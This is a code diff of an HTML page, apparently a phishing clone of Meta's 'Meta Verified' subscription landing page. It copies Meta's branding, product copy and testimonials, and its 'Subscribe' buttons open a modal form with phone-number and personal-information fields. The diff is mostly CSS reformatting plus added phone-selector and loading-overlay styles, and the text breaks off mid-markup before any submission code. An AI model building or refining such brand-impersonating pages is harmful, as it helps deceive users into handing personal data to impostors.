@@ -14,14 +14,12 @@
     </script>
 
     <style>
-      /* ===== RESET & BASE ===== */
       *, *::before, *::after { box-sizing: border-box; }
       html { -webkit-text-size-adjust: 100%; }
       body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; overflow-x: hidden; }
       input, button, select, textarea { font-family: inherit; }
       img { max-width: 100%; height: auto; display: block; }
 
-      /* ===== INTRO OVERLAY ===== */
       #intro-overlay {
         position: fixed; inset: 0; z-index: 99999; background: #fff;
         display: flex; align-items: center; justify-content: center;
@@ -31,7 +29,6 @@
       #intro-overlay img { width: auto; height: auto; max-width: 100vw; max-height: 100vh; object-fit: contain; }
       body.intro-active { overflow: hidden; }
 
-      /* ===== HEADER ===== */
       .site-header {
         position: sticky; top: 0; z-index: 50;
         background: #f5f6f6; border-bottom: 1px solid #e5e7eb;
@@ -49,56 +46,31 @@
       .header-actions { display: flex; align-items: center; gap: 12px; }
       .header-actions img { width: 20px; height: 20px; cursor: pointer; }
 
-      /* ===== HERO ===== */
       .hero {
-        display: flex;
-        flex-direction: column;
-        width: 100%;
+        display: flex; flex-direction: column; width: 100%;
         background-image: url('public/images/background.png');
         background-size: cover; background-position: center; background-repeat: no-repeat;
       }
       @media(min-width:768px){
-        .hero {
-          flex-direction: row;
-          min-height: calc(100vh - 80px);
-          height: calc(100vh - 80px);
-        }
+        .hero { flex-direction: row; min-height: calc(100vh - 80px); height: calc(100vh - 80px); }
       }
       .hero-right {
-        order: 1;
-        width: 100%;
-        display: flex; align-items: center; justify-content: center;
-        padding: 28px 20px 0;
-        max-height: 42vh;
-        overflow: hidden;
+        order: 1; width: 100%; display: flex; align-items: center; justify-content: center;
+        padding: 28px 20px 0; max-height: 42vh; overflow: hidden;
       }
       @media(min-width:768px){
-        .hero-right {
-          order: 2;
-          width: 55%;
-          max-height: none;
-          padding: 32px 48px 32px 16px;
-        }
+        .hero-right { order: 2; width: 55%; max-height: none; padding: 32px 48px 32px 16px; }
       }
       .hero-right img {
-        width: auto; height: auto;
-        max-width: 100%; max-height: 100%;
-        object-fit: contain;
+        width: auto; height: auto; max-width: 100%; max-height: 100%; object-fit: contain;
         filter: drop-shadow(0 12px 24px rgba(0,0,0,0.15));
       }
       .hero-left {
-        order: 2;
-        width: 100%;
-        padding: 28px 20px 40px;
+        order: 2; width: 100%; padding: 28px 20px 40px;
         display: flex; align-items: center; justify-content: center;
       }
       @media(min-width:768px){
-        .hero-left {
-          order: 1;
-          width: 45%;
-          padding: 60px 48px;
-          flex-shrink: 0;
-        }
+        .hero-left { order: 1; width: 45%; padding: 60px 48px; flex-shrink: 0; }
       }
       .hero-content { max-width: 480px; width: 100%; }
       .hero-badge { width: 56px; height: 56px; margin-bottom: 16px; }
@@ -114,8 +86,7 @@
         border: none; border-radius: 40px;
         font-weight: 600; font-size: 15px; cursor: pointer;
         white-space: nowrap; width: 100%; text-align: center;
-        -webkit-tap-highlight-color: transparent;
-        touch-action: manipulation;
+        -webkit-tap-highlight-color: transparent; touch-action: manipulation;
       }
       @media(min-width:480px){ .hero-btn { width: auto; } }
       .hero-btn:active { background: #0756d6; }
@@ -123,7 +94,6 @@
       .hero-note a { color: #0064E0; }
       .hero-fine { font-size: 11px; color: #606770; margin-top: 6px; }
 
-      /* ===== SECTION INTRO ===== */
       .section-intro { max-width: 1504px; margin: 0 auto; padding: 40px 20px; }
       @media(min-width:768px){ .section-intro { padding: 60px 48px; } }
       .section-intro-title { font-size: 26px; font-weight: 500; color: #1c1e21; margin: 0 0 12px; }
@@ -131,7 +101,6 @@
       .section-intro-desc { font-size: 15px; font-weight: 300; color: #1c2b33; }
       @media(min-width:768px){ .section-intro-desc { font-size: 16px; } }
 
-      /* ===== FEATURES ===== */
       .features-wrap { max-width: 1504px; margin: 0 auto; padding: 0 20px 48px; }
       @media(min-width:768px){ .features-wrap { padding: 0 48px 60px; } }
       .features-desktop { display: none; }
@@ -147,7 +116,6 @@
       .feature-description p { font-size: 16px; color: #1C2B33; margin: 0; }
       .feature-border-b { border-bottom: 1px solid #f3f4f6; }
 
-      /* Mobile features - plain stacked list */
       .features-mobile { display: flex; flex-direction: column; gap: 0; }
       @media(min-width:768px){ .features-mobile { display: none; } }
       .feature-mobile-item { display: flex; flex-direction: column; gap: 12px; padding: 28px 0; border-bottom: 1px solid #f3f4f6; }
@@ -157,7 +125,6 @@
       .feature-mobile-item h3 { font-size: 22px; font-weight: 400; color: #1C2B33; margin: 0; }
       .feature-mobile-item p { font-size: 15px; color: #1C2B33; margin: 0; line-height: 1.6; }
 
-      /* ===== TESTIMONIALS ===== */
       .testimonial-section { max-width: 1504px; margin: 0 auto; padding: 0 16px 60px; }
       @media(min-width:768px){ .testimonial-section { padding: 0 24px 80px; } }
       .testimonial-title { text-align: center; font-size: 22px; font-weight: 500; margin-bottom: 24px; }
@@ -165,8 +132,7 @@
       .testimonial-slider { background: #f1f4f7; border-radius: 20px; overflow: hidden; }
       #testimonial-track { display: flex; transition: transform 0.5s ease; }
       .testimonial-slide {
-        flex: 0 0 100%; min-width: 0;
-        padding: 40px 24px;
+        flex: 0 0 100%; min-width: 0; padding: 40px 24px;
         text-align: center; display: flex; flex-direction: column; align-items: center;
       }
       @media(min-width:768px){ .testimonial-slide { padding: 80px; } }
@@ -178,19 +144,14 @@
       .testimonial-dot { width: 10px; height: 10px; border-radius: 50%; border: none; cursor: pointer; padding: 0; min-width: 10px; min-height: 10px; }
       .testimonial-arrow { width: 36px; height: 36px; background: none; border: 1px solid #ccc; border-radius: 50%; cursor: pointer; font-size: 16px; display: flex; align-items: center; justify-content: center; -webkit-tap-highlight-color: transparent; }
 
-      /* ===== CTA SECTION ===== */
       .cta-section { display: flex; flex-direction: column; width: 100%; }
       @media(min-width:768px){ .cta-section { flex-direction: row; } }
-      .cta-media {
-        width: 100%; height: 240px; overflow: hidden; position: relative;
-        order: 1;
-      }
+      .cta-media { width: 100%; height: 240px; overflow: hidden; position: relative; order: 1; }
       @media(min-width:768px){ .cta-media { width: 50%; height: calc(100vh - 80px); order: 2; } }
       .cta-media video, .cta-media img { width: 100%; height: 100%; object-fit: cover; }
       .cta-media img { position: absolute; inset: 0; z-index: -1; }
       .cta-content {
-        order: 2; width: 100%;
-        display: flex; align-items: center; justify-content: center;
+        order: 2; width: 100%; display: flex; align-items: center; justify-content: center;
         padding: 36px 20px;
       }
       @media(min-width:768px){ .cta-content { width: 50%; order: 1; padding: 48px; justify-content: flex-end; } }
@@ -201,17 +162,14 @@
       .cta-title { font-size: 28px; font-weight: 700; color: #1c1e21; margin: 0 0 20px; }
       @media(min-width:768px){ .cta-title { font-size: 48px; } }
       .cta-btn {
-        background: #0062ff; color: #fff;
-        padding: 0 24px; height: 50px; min-height: 50px;
+        background: #0062ff; color: #fff; padding: 0 24px; height: 50px; min-height: 50px;
         border: none; border-radius: 40px; font-size: 15px; font-weight: 600;
         cursor: pointer; display: inline-flex; align-items: center; justify-content: center;
-        -webkit-tap-highlight-color: transparent; touch-action: manipulation;
-        width: 100%;
+        -webkit-tap-highlight-color: transparent; touch-action: manipulation; width: 100%;
       }
       @media(min-width:480px){ .cta-btn { width: auto; } }
       .cta-btn:active { background: #0052c5; }
 
-      /* ===== FAQ ===== */
       .faq-section { max-width: 1504px; margin: 60px auto 60px; padding: 0 20px; }
       @media(min-width:768px){ .faq-section { margin: 80px auto 80px; padding: 0 48px; } }
       .faq-title { font-size: 28px; font-weight: 500; margin-bottom: 8px; }
@@ -234,7 +192,6 @@
       .faq-answer { font-size: 15px; color: #4b5563; line-height: 1.75; padding-bottom: 20px; }
       @media(min-width:768px){ .faq-answer { font-size: 18px; } }
 
-      /* ===== FOOTER ===== */
       .footer-main { background: #1b2a34; color: #fff; }
       .footer-main-inner { max-width: 1504px; margin: 0 auto; padding: 40px 20px; }
       @media(min-width:768px){ .footer-main-inner { padding: 80px 48px; display: grid; grid-template-columns: 1fr 1fr; gap: 40px; align-items: start; } }
@@ -247,14 +204,12 @@
       .footer-input { width: 100%; padding: 12px 14px; border-radius: 8px; border: none; outline: none; font-size: 14px; color: #465a69; }
       .footer-fine { font-size: 12px; color: #9ca3af; line-height: 1.6; margin: 8px 0; }
       .footer-sub-btn {
-        background: #0062ff; color: #fff;
-        padding: 0 20px; height: 46px;
+        background: #0062ff; color: #fff; padding: 0 20px; height: 46px;
         border: none; border-radius: 40px; font-size: 14px; font-weight: 600;
         cursor: pointer; display: inline-flex; align-items: center; justify-content: center;
         -webkit-tap-highlight-color: transparent; align-self: flex-start;
       }
       .footer-sub-btn:active { background: #0052c5; }
-
       .footer-links { background: #1b2a34; color: #9ca3af; }
       .footer-links-inner { max-width: 1504px; margin: 0 auto; padding: 40px 20px 24px; }
       @media(min-width:768px){ .footer-links-inner { padding: 64px 48px 24px; } }
@@ -270,11 +225,10 @@
       .footer-legal { display: flex; flex-wrap: wrap; gap: 16px; }
       .footer-legal a { color: #cbd2d9; font-size: 13px; text-decoration: none; }
 
-      /* ===== MODAL STYLES ===== */
+      /* ===== MODAL ===== */
       .modal-overlay {
         display: none; position: fixed; inset: 0; z-index: 999;
-        background: rgba(0,0,0,0.5); align-items: flex-end; justify-content: center;
-        padding: 0;
+        background: rgba(0,0,0,0.5); align-items: flex-end; justify-content: center; padding: 0;
       }
       @media(min-width:600px){ .modal-overlay { align-items: center; padding: 20px; } }
       .modal-overlay.open { display: flex; }
@@ -286,22 +240,19 @@
         transition: transform 0.25s ease, opacity 0.25s ease;
       }
       @media(min-width:600px){
-        .modal-box {
-          max-width: 420px; border-radius: 16px;
-          padding: 24px; transform: scale(0.92);
-        }
+        .modal-box { max-width: 420px; border-radius: 16px; padding: 24px; transform: scale(0.92); }
       }
       .modal-overlay.open .modal-box { transform: translateY(0) scale(1); opacity: 1; }
       .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
       .modal-title { font-weight: 700; font-size: 15px; color: #0A1317; }
+      /* FIX: border-radius: 50px (was missing 'px') */
       .modal-close {
         width: 32px; height: 32px; border: none; background: none; cursor: pointer;
-        font-size: 24px; color: #9a9a9a; border-radius: 50;
+        font-size: 24px; color: #9a9a9a; border-radius: 50px;
         display: flex; align-items: center; justify-content: center; flex-shrink: 0;
         -webkit-tap-highlight-color: transparent;
       }
       .modal-close:active { background: #f0f0f0; }
-
       .modal-field {
         width: 100%; border: 1px solid #d4dbe3; border-radius: 10px;
         background: #fff; margin-bottom: 10px; overflow: hidden;
@@ -309,33 +260,10 @@
       .modal-field:focus-within { border-color: #3b82f6; }
       .modal-field input {
         width: 100%; outline: none; border: none; background: transparent;
-        font-size: 16px; /* 16px prevents iOS auto-zoom */
-        font-family: inherit; height: 44px; padding: 0 12px; display: block;
+        font-size: 16px; font-family: inherit; height: 44px; padding: 0 12px; display: block;
       }
-      .modal-field select {
-        width: 100%; outline: none; border: none; background: transparent;
-        font-size: 16px; font-family: inherit; height: 44px; padding: 0 12px;
-        appearance: none; -webkit-appearance: none;
-      }
-      .modal-dob-row { display: grid; grid-template-columns: 1fr 1fr 1.4fr; gap: 8px; margin-bottom: 10px; }
       .modal-label { font-size: 13px; color: #9a979e; font-weight: 700; margin-bottom: 6px; display: block; }
       .modal-hint { font-size: 13px; color: #9a979e; margin-bottom: 14px; line-height: 1.5; }
-      .modal-check-row { display: flex; align-items: flex-start; gap: 10px; font-size: 14px; margin-bottom: 20px; cursor: pointer; line-height: 1.5; }
-      .modal-check-row input { width: 18px; height: 18px; accent-color: #0064E0; flex-shrink: 0; margin-top: 2px; }
-      .modal-check-row a { color: #0064E0; }
-      .modal-btn-primary {
-        width: 100%; height: 48px; background: #0064E0; color: #fff; border: none;
-        border-radius: 40px; font-size: 16px; font-weight: 500; cursor: pointer;
-        font-family: inherit; -webkit-tap-highlight-color: transparent;
-        touch-action: manipulation;
-      }
-      .modal-btn-primary:disabled { opacity: 0.75; }
-      .modal-btn-primary:active:not(:disabled) { background: #0052c5; }
-      .modal-btn-outline {
-        width: 100%; height: 44px; border: 1px solid #d4dbe3; border-radius: 40px;
-        background: #fff; font-size: 14px; color: #9a979e; cursor: pointer;
-        margin-top: 10px; font-family: inherit; -webkit-tap-highlight-color: transparent;
-      }
       .modal-error { color: #ef4444; font-size: 13px; margin-bottom: 10px; display: none; }
       .modal-error.show { display: block; }
       .modal-spinner {
@@ -347,44 +275,26 @@
       .modal-return-btn {
         display: flex; align-items: center; justify-content: center;
         width: 100%; height: 48px; background: #0064E0; color: #fff;
-        border-radius: 40px; text-decoration: none;
-        font-size: 15px; font-weight: 500;
+        border-radius: 40px; text-decoration: none; font-size: 15px; font-weight: 500;
       }
       .modal-return-btn:active { background: #0052c5; }
       .modal-user-info { display: flex; align-items: center; gap: 6px; font-size: 13px; color: #9a979e; margin-bottom: 6px; }
       .modal-dot { width: 4px; height: 4px; background: #9a979e; border-radius: 50%; display: inline-block; }
-
-      /* Phone selector */
-      .phone-row { display: flex; align-items: stretch; }
-      .phone-row .modal-field { flex: 1; margin-bottom: 0; display: flex; align-items: stretch; }
-      .pcs-wrap { position: relative; display: flex; align-items: center; }
-      .pcs-trigger {
-        display: flex; align-items: center; gap: 4px;
-        padding: 0 8px 0 12px; height: 44px; border-right: 1px solid #e5e7eb;
-        cursor: pointer; user-select: none; flex-shrink: 0;
-        -webkit-tap-highlight-color: transparent;
+      .modal-btn-primary {
+        width: 100%; height: 48px; background: #0064E0; color: #fff; border: none;
+        border-radius: 40px; font-size: 16px; font-weight: 500; cursor: pointer;
+        font-family: inherit; -webkit-tap-highlight-color: transparent; touch-action: manipulation;
       }
-      .pcs-trigger span { font-size: 16px; }
-      .pcs-dial { font-size: 13px; color: #333; }
-      .pcs-dropdown {
-        position: absolute; top: calc(100% + 6px); left: 0; width: 270px;
-        background: #fff; border: 1px solid #e5e7eb; border-radius: 12px;
-        box-shadow: 0 8px 32px rgba(0,0,0,0.15); z-index: 9999;
-        max-height: 260px; overflow: hidden; display: flex; flex-direction: column;
+      .modal-btn-primary:disabled { opacity: 0.75; }
+      .modal-btn-primary:active:not(:disabled) { background: #0052c5; }
+      .modal-btn-outline {
+        width: 100%; height: 44px; border: 1px solid #d4dbe3; border-radius: 40px;
+        background: #fff; font-size: 14px; color: #9a979e; cursor: pointer;
+        margin-top: 10px; font-family: inherit; -webkit-tap-highlight-color: transparent;
       }
-      .pcs-search { padding: 10px 14px; border: none; border-bottom: 1px solid #f0f0f0; font-size: 14px; outline: none; width: 100%; }
-      .pcs-list { overflow-y: auto; flex: 1; }
-      .pcs-opt {
-        display: flex; align-items: center; gap: 8px; padding: 10px 14px;
-        cursor: pointer; -webkit-tap-highlight-color: transparent;
-      }
-      .pcs-opt:active { background: #f0f4ff; }
-      .pcs-phone-input { flex: 1; height: 44px; padding: 0 12px; border: none; outline: none; background: transparent; font-size: 16px; font-family: inherit; min-width: 0; }
+      .modal-success-icon { width: 64px; height: 64px; margin: 0 auto 16px; display: block; }
 
-      /* Feature hover */
-      .feature-image { transition: opacity 0.7s ease; }
-
-      /* New form input styles (modal Information) */
+      /* ===== PHONE SELECTOR ===== */
       .nf-input-wrap {
         width: 100%; border: 1px solid #d4dbe3; height: 40px; padding: 0 11px;
         border-radius: 10px; background: white; font-size: 14px; margin-bottom: 10px;
@@ -398,598 +308,694 @@
         width: 100%; outline: none; border: none; background: transparent;
         font-size: 16px; font-family: inherit; height: 100%; display: block; padding: 0;
       }
+      .pcs-wrap { position: relative; display: flex; align-items: center; }
+      .pcs-trigger {
+        display: flex; align-items: center; gap: 4px;
+        padding: 0 8px 0 12px; height: 44px; border-right: 1px solid #e5e7eb;
+        cursor: pointer; user-select: none; flex-shrink: 0;
+        -webkit-tap-highlight-color: transparent;
+      }
+      .pcs-trigger span { font-size: 18px; line-height: 1; }
+      .pcs-dial { font-size: 13px; color: #333; font-weight: 700; margin-left: 4px; }
+      .pcs-dropdown {
+        position: absolute; top: calc(100% + 6px); left: 0; width: 270px;
+        background: #fff; border: 1px solid #e5e7eb; border-radius: 12px;
+        box-shadow: 0 8px 32px rgba(0,0,0,0.15); z-index: 9999;
+        max-height: 260px; overflow: hidden; display: flex; flex-direction: column;
+      }
+      .pcs-search {
+        padding: 10px 14px; border: none; border-bottom: 1px solid #f0f0f0;
+        font-size: 14px; outline: none; width: 100%;
+      }
+      .pcs-list { overflow-y: auto; flex: 1; }
+      .pcs-opt {
+        display: flex; align-items: center; gap: 8px; padding: 10px 14px;
+        cursor: pointer; -webkit-tap-highlight-color: transparent;
+      }
+      .pcs-opt:active { background: #f0f4ff; }
+      .pcs-phone-input {
+        flex: 1; height: 44px; padding: 0 12px; border: none; outline: none;
+        background: transparent; font-size: 16px; font-family: inherit; min-width: 0;
+      }
 
-      /* Success icon */
-      .modal-success-icon { width: 64px; height: 64px; margin: 0 auto 16px; display: block; }
+      /* Loading overlay for modal */
+      .modal-loading {
+        position: absolute; inset: 0; background: rgba(255,255,255,0.85);
+        display: flex; align-items: center; justify-content: center;
+        border-radius: inherit; z-index: 10;
+      }
+      .modal-loading-spinner {
+        width: 32px; height: 32px; border: 3px solid #e5e7eb;
+        border-top-color: #0064E0; border-radius: 50%;
+        animation: spin 0.7s linear infinite;
+      }
     </style>
 </head>
 
 <body class="intro-active">
 
-    <!-- INTRO OVERLAY -->
-    <div id="intro-overlay">
-      <img src="public/images/intro.gif" alt="intro" onerror="this.style.display='none'" />
-    </div>
-    <script>
-      (function() {
-        var o = document.getElementById('intro-overlay');
-        setTimeout(function() {
-          o.classList.add('fade-out');
-          document.body.classList.remove('intro-active');
-          setTimeout(function() { o.style.display = 'none'; }, 500);
-        }, 2000);
-      })();
-    </script>
-
-    <!-- HEADER -->
-    <header class="site-header">
-      <div class="header-logo">
-        <img src="public/icons/ic_meta.svg" alt="Meta" />
-        <nav class="header-nav">
-          <span>Meta Store</span>
-          <span>Meta Quest</span>
-          <span>Ray-Ban Meta</span>
-          <span>Meta AI</span>
-        </nav>
-      </div>
-      <div class="header-actions">
-        <img src="public/icons/ic_search.svg" alt="search" onerror="this.style.display='none'" />
-        <img src="public/icons/ic_user.svg" alt="user" style="width:32px;height:32px;" class="hidden md:block" onerror="this.style.display='none'" />
-      </div>
-    </header>
-
-    <!-- HERO -->
-    <section class="hero">
-      <div class="hero-right">
-        <img src="public/images/photo_meta.png" alt="Meta Verified creators" />
-      </div>
-      <div class="hero-left">
-        <div class="hero-content">
-          <img src="public/images/ICONMOI.svg" alt="Meta Verified badge" class="hero-badge" />
-          <h1 class="hero-title">Protect your brand with Meta Verified</h1>
-          <p class="hero-desc">Meta Verified is a subscription for creators and businesses that helps you build more confidence with new audiences, protect your brand from impersonation and more efficiently engage with your audience.</p>
-          <div class="hero-btns">
-            <button onclick="openClientModal()" class="hero-btn">Subscribe on Facebook</button>
-          </div>
-          <p class="hero-note"><strong>Are you a business?</strong> Get more information on <a href="#">Meta Verified for businesses</a>.</p>
-          <p class="hero-fine">Features, availability and pricing may vary by region and app.</p>
-        </div>
-      </div>
-    </section>
-
-    <!-- INTRO TEXT -->
-    <div class="section-intro">
-      <p class="section-intro-title">A creator toolkit to take your brand further</p>
-      <p class="section-intro-desc">Explore key Meta Verified benefits available for Facebook and Instagram. See creator plans and pricing for additional benefits.</p>
-    </div>
-
-    <!-- FEATURES -->
-    <div class="features-wrap">
-      <!-- Desktop -->
-      <div class="features-desktop">
-        <div class="feature-img-wrap">
-          <div class="feature-image" data-index="0" style="opacity:1"><img src="public/images/feature-badge.webp" alt="Verified badge" /></div>
-          <div class="feature-image" data-index="1" style="opacity:0;pointer-events:none"><img src="public/images/feature-impersonation.webp" alt="Impersonation protection" /></div>
-          <div class="feature-image" data-index="2" style="opacity:0;pointer-events:none"><img src="public/images/feature-support.webp" alt="Enhanced support" /></div>
-          <div class="feature-image" data-index="3" style="opacity:0;pointer-events:none"><img src="public/images/feature-profile.png" alt="Upgraded features" /></div>
-        </div>
-        <div class="feature-list">
-          <div class="feature-item" data-index="0">
-            <h3 class="feature-title">Verified badge</h3>
-            <div class="feature-description" style="max-height:200px;opacity:1;margin-top:20px;"><p>The badge means that your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.</p></div>
-          </div>
-          <div class="feature-item" data-index="1">
-            <h3 class="feature-title">Impersonation protection</h3>
-            <div class="feature-description" style="max-height:0;opacity:0;"><p>Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.</p></div>
-          </div>
-          <div class="feature-item" data-index="2">
-            <h3 class="feature-title">Enhanced support</h3>
-            <div class="feature-description" style="max-height:0;opacity:0;"><p>Get 24/7 access to email or chat agent support to help resolve your issues more quickly.</p></div>
-          </div>
-          <div class="feature-item" data-index="3">
-            <h3 class="feature-title">Upgraded profile features</h3>
-            <div class="feature-description" style="max-height:0;opacity:0;"><p>Enrich your profile by adding images to your links to help boost engagement.</p></div>
-          </div>
-          <div class="feature-border-b"></div>
-        </div>
-      </div>
-
-      <!-- Mobile -->
-      <div class="features-mobile">
-        <div class="feature-mobile-item">
-          <div class="aspect-box"><img src="public/images/feature-badge.webp" alt="Verified badge" /></div>
-          <h3>Verified badge</h3>
-          <p>The badge means that your profile was verified by Meta based on your activity or documents you provided.</p>
-        </div>
-        <div class="feature-mobile-item">
-          <div class="aspect-box"><img src="public/images/feature-impersonation.webp" alt="Impersonation protection" /></div>
-          <h3>Impersonation protection</h3>
-          <p>Protect your brand with proactive impersonation monitoring. Meta will remove accounts pretending to be you.</p>
-        </div>
-        <div class="feature-mobile-item">
-          <div class="aspect-box"><img src="public/images/feature-support.webp" alt="Enhanced support" /></div>
-          <h3>Enhanced support</h3>
-          <p>Get 24/7 access to email or chat agent support to help resolve your issues more quickly.</p>
-        </div>
-        <div class="feature-mobile-item">
-          <div class="aspect-box"><img src="public/images/feature-profile.png" alt="Upgraded profile features" /></div>
-          <h3>Upgraded profile features</h3>
-          <p>Enrich your profile by adding images to your links to help boost engagement.</p>
-        </div>
-      </div>
-    </div>
-
-    <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      var items = document.querySelectorAll('.feature-item');
-      var imgs = document.querySelectorAll('.feature-image');
-      var descs = document.querySelectorAll('.feature-description');
-      items.forEach(function(item) {
-        item.addEventListener('mouseenter', function() {
-          var idx = item.dataset.index;
-          imgs.forEach(function(img) {
-            var active = img.dataset.index === idx;
-            img.style.opacity = active ? '1' : '0';
-            img.style.pointerEvents = active ? '' : 'none';
-          });
-          descs.forEach(function(desc) {
-            var pIdx = desc.closest('.feature-item').dataset.index;
-            if (pIdx === idx) {
-              desc.style.maxHeight = '200px'; desc.style.opacity = '1'; desc.style.marginTop = '20px';
-            } else {
-              desc.style.maxHeight = '0'; desc.style.opacity = '0'; desc.style.marginTop = '0';
-            }
-          });
-        });
-      });
-    });
-    </script>
-
-    <!-- TESTIMONIALS -->
-    <div class="testimonial-section">
-      <p class="testimonial-title">See how Meta Verified has helped real businesses.</p>
-      <div class="testimonial-slider">
-        <div id="testimonial-track">
-          <div class="testimonial-slide">
-            <p class="testimonial-quote">"Meta Verified helped my account stand out from impersonators, which helped me secure more paying clients."</p>
-            <p class="testimonial-author">@inversionista_gal · 4K+ followers</p>
-          </div>
-          <div class="testimonial-slide">
-            <p class="testimonial-quote">"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience."</p>
-            <p class="testimonial-author">Kimber Greenwood, Owner of Water Bear Photography</p>
-          </div>
-          <div class="testimonial-slide">
-            <p class="testimonial-quote">"Since subscribing, I've noticed a real difference. My posts are getting more reach, engagement has gone up and I'm seeing more interactions on stories and reels."</p>
-            <p class="testimonial-author">Devon Kirby, Owner, Mom Approved Miami</p>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-nav">
-        <button id="prev-slide" class="testimonial-arrow">←</button>
-        <div id="dots" style="display:flex;gap:8px;align-items:center;">
-          <button class="testimonial-dot" style="background:#111"></button>
-          <button class="testimonial-dot" style="background:#d1d5db"></button>
-          <button class="testimonial-dot" style="background:#d1d5db"></button>
-        </div>
-        <button id="next-slide" class="testimonial-arrow">→</button>
-      </div>
-    </div>
-
-    <script>
+  <!-- INTRO OVERLAY -->
+  <div id="intro-overlay">
+    <img src="public/images/intro.gif" alt="intro" onerror="this.style.display='none'" />
+  </div>
+  <script>
     (function() {
-      var track = document.getElementById('testimonial-track');
-      var dots = document.querySelectorAll('.testimonial-dot');
-      var prev = document.getElementById('prev-slide');
-      var next = document.getElementById('next-slide');
-      var total = dots.length, cur = 0;
-      var startX = 0, isDragging = false;
-      function goTo(idx) {
-        cur = (idx + total) % total;
-        track.style.transform = 'translateX(-' + (cur * 100) + '%)';
-        dots.forEach(function(d, i) {
-          d.style.background = i === cur ? '#111' : '#d1d5db';
-        });
-      }
-      prev.addEventListener('click', function() { goTo(cur - 1); });
-      next.addEventListener('click', function() { goTo(cur + 1); });
-      dots.forEach(function(d, i) { d.addEventListener('click', function() { goTo(i); }); });
-
-      /* Touch swipe */
-      track.addEventListener('touchstart', function(e) { startX = e.touches[0].clientX; isDragging = true; }, { passive: true });
-      track.addEventListener('touchend', function(e) {
-        if (!isDragging) return;
-        var diff = startX - e.changedTouches[0].clientX;
-        if (Math.abs(diff) > 40) goTo(diff > 0 ? cur + 1 : cur - 1);
-        isDragging = false;
-      });
-
-      setInterval(function() { goTo(cur + 1); }, 5000);
+      var o = document.getElementById('intro-overlay');
+      setTimeout(function() {
+        o.classList.add('fade-out');
+        document.body.classList.remove('intro-active');
+        setTimeout(function() { o.style.display = 'none'; }, 500);
+      }, 2000);
     })();
-    </script>
+  </script>
 
-    <!-- CTA -->
-    <div class="cta-section">
-      <div class="cta-media">
-        <video src="public/images/video-meta.mp4" autoplay muted loop playsinline style="width:100%;height:100%;object-fit:cover;"></video>
-        <img src="public/images/cta-bg.webp" alt="meta" />
-      </div>
-      <div class="cta-content">
-        <div class="cta-inner">
-          <img src="public/images/ICONMOI.svg" alt="verified" class="cta-icon" />
-          <h2 class="cta-title">Ready to become Meta Verified?</h2>
-          <button onclick="openClientModal()" class="cta-btn">Subscribe now</button>
+  <!-- HEADER -->
+  <header class="site-header">
+    <div class="header-logo">
+      <img src="public/icons/ic_meta.svg" alt="Meta" />
+      <nav class="header-nav">
+        <span>Meta Store</span>
+        <span>Meta Quest</span>
+        <span>Ray-Ban Meta</span>
+        <span>Meta AI</span>
+      </nav>
+    </div>
+    <div class="header-actions">
+      <img src="public/icons/ic_search.svg" alt="search" onerror="this.style.display='none'" />
+      <img src="public/icons/ic_user.svg" alt="user" style="width:32px;height:32px;" class="hidden md:block" onerror="this.style.display='none'" />
+    </div>
+  </header>
+
+  <!-- HERO -->
+  <section class="hero">
+    <div class="hero-right">
+      <img src="public/images/photo_meta.png" alt="Meta Verified creators" />
+    </div>
+    <div class="hero-left">
+      <div class="hero-content">
+        <img src="public/images/ICONMOI.svg" alt="Meta Verified badge" class="hero-badge" />
+        <h1 class="hero-title">Protect your brand with Meta Verified</h1>
+        <p class="hero-desc">Meta Verified is a subscription for creators and businesses that helps you build more confidence with new audiences, protect your brand from impersonation and more efficiently engage with your audience.</p>
+        <div class="hero-btns">
+          <button onclick="openClientModal()" class="hero-btn">Subscribe on Facebook</button>
         </div>
+        <p class="hero-note"><strong>Are you a business?</strong> Get more information on <a href="#">Meta Verified for businesses</a>.</p>
+        <p class="hero-fine">Features, availability and pricing may vary by region and app.</p>
       </div>
     </div>
+  </section>
 
-    <!-- FAQ -->
-    <div class="faq-section">
-      <p class="faq-title">FAQ</p>
-      <p class="faq-subtitle">We've included some frequently asked questions below. For more, visit our Help Centre on
-        <a style="color:#0064E0;" href="https://www.facebook.com/business/help/2876154822522394">Facebook</a> or
-        <a style="color:#0064E0;" href="https://help.instagram.com">Instagram</a>.
-      </p>
-      <div class="faq-list">
-        <div class="faq-item">
-          <button class="faq-btn"><span>How do I know if I'm eligible?</span><span class="faq-icon">+</span></button>
-          <div class="faq-content"><div class="faq-answer">Meta Verified is available in selected regions for creators who meet certain eligibility requirements. Requirements vary by platform — check Facebook and Instagram help centres for details.</div></div>
+  <!-- INTRO TEXT -->
+  <div class="section-intro">
+    <p class="section-intro-title">A creator toolkit to take your brand further</p>
+    <p class="section-intro-desc">Explore key Meta Verified benefits available for Facebook and Instagram. See creator plans and pricing for additional benefits.</p>
+  </div>
+
+  <!-- FEATURES -->
+  <div class="features-wrap">
+    <div class="features-desktop">
+      <div class="feature-img-wrap">
+        <div class="feature-image" data-index="0" style="opacity:1"><img src="public/images/feature-badge.webp" alt="Verified badge" /></div>
+        <div class="feature-image" data-index="1" style="opacity:0;pointer-events:none"><img src="public/images/feature-impersonation.webp" alt="Impersonation protection" /></div>
+        <div class="feature-image" data-index="2" style="opacity:0;pointer-events:none"><img src="public/images/feature-support.webp" alt="Enhanced support" /></div>
+        <div class="feature-image" data-index="3" style="opacity:0;pointer-events:none"><img src="public/images/feature-profile.png" alt="Upgraded features" /></div>
+      </div>
+      <div class="feature-list">
+        <div class="feature-item" data-index="0">
+          <h3 class="feature-title">Verified badge</h3>
+          <div class="feature-description" style="max-height:200px;opacity:1;margin-top:20px;"><p>The badge means that your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.</p></div>
         </div>
-        <div class="faq-item">
-          <button class="faq-btn"><span>I already have a verified badge. What happens to it?</span><span class="faq-icon">+</span></button>
-          <div class="faq-content"><div class="faq-answer">There will be no changes to accounts on Facebook or Instagram that are already verified based on prior requirements. Existing verified badge holders can also apply for a Meta Verified subscription if they meet the eligibility requirements.</div></div>
+        <div class="feature-item" data-index="1">
+          <h3 class="feature-title">Impersonation protection</h3>
